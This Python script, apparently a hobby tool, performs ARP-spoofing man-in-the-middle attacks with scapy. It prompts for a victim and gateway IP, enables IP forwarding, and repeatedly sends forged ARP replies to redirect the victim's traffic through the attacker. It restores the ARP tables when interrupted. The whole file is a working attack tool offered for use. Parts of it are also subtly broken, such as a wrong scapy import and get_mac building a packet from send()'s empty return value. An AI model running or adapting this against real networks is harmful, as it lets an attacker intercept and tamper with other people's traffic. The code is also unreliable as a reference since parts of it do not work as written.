from scapy import *
import sys
import os
import time

try:
    interface = input("[*] Enter Desired Interface: ")
    victimIP = input("[*] Enter Victim IP: ")
    gatewayIP = input("[*] Enter Gateway IP: ")
except KeyboardInterrupt:
    print("\n[*] User Requested Shutdown")
    print("[*] Exiting...")
    sys.exit(1)
def enable_ipforwarding():
    path = "/proc/sys/net/ipv4/ip_forward"
    with open(path) as f:
        if f.read() == 1:
            # already enabled
            return
    with open(path, "w") as f:
        print(1, file=f)
enable_ipforwarding()
print("[*] Enabling IP Forwarding...\n")

def get_mac(IP):
    arp_request = send(ARP(pdst=IP))
    # Create ether packet object. dst - broadcast mac address. 
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    # Combine two packets in two one
    arp_request_broadcast = broadcast/arp_request
    # Get list with answered hosts
    answered_list = srp(arp_request_broadcast, timeout=1,verbose=False)[0]
    # Return host mac address
    return answered_list[0][1].hwsrc
    

def reARP(): 
    print ("[*] Restoring Targets...")
    victimMAC = get_mac(victimIP)
    gatewayMAC = get_mac(gatewayIP)
    send(ARP(op=2, psrc=gatewayIP, pdst=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMAC), count=7)
    send(ARP(op=2, psrc=victimIP, pdst=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
    print("[*] Disabling IP Forwarding...")
    print("[*] Shutting Down...")
    sys.exit(1)

def trick(gm, vm):
    send(ARP(op=2, psrc=gatewayIP, pdst=victimIP, hwdst=vm))
    send(ARP(op=2, psrc=victimIP, pdst=gatewayIP, hwdst=gm))

def mitm():
    print(get_mac(victimIP))
    try:
        victimMAC = get_mac(victimIP)
    except Exception:
        print("[!] Couldn't Find Victim MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    try: 
        gatewayMAC = get_mac(gatewayIP)
    except Exception:
        print("[!] Couldn't Find Gateway MAC Address")
        print("[!] Exiting...")
        sys.exit(1)
    print("[*] Poisoning Targets...")
    while 1:
        try:
            trick(gatewayMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break


mitm()
